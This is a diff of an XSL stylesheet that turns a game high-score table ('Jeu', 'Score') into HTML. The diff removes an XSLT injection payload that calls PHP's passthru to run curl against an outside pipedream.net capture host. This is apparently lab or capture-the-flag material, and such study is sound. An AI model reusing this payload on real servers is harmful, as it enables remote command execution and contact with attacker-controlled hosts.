@@ -1,5 +1,21 @@
-<xsl:stylesheet version=”1.0″ xmlns:xsl=”http://www.w3.org/1999/XSL/Transform” xmlns:php=”http://php.net/xsl”>
-<xsl:template match=”/”>
-<xsl:value-of select=”php:function(‘passthru’,’curl https://eoilgx3ntirh152.m.pipedream.net’)”/>
-</xsl:template>
-</xsl:stylesheet>
+<?xml version="1.0" encoding="UTF-8"?>
+<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
+        <body style="font-family:'VT323';font-size:12pt;background-color:#EEEEEE">
+        <table style="background-color: green;border: 2px dashed pink;">
+                <thead style="background-color:red;border:1px solid black;">
+                        <tr>
+                                <th>Jeu</th>
+                                <th>Score</th>
+                        </tr>
+                </thead>
+                <tbody>
+                        <xsl:for-each select="scores/score">
+                                <tr>
+                                        <td><xsl:value-of select="game"/></td>
+                                        <td style="color: yellow;text-decoration: blink"><xsl:value-of select="highscore"/></td>
+                                </tr>
+                        </xsl:for-each>
+                </tbody>
+        </table>
+        </body>
+</html>
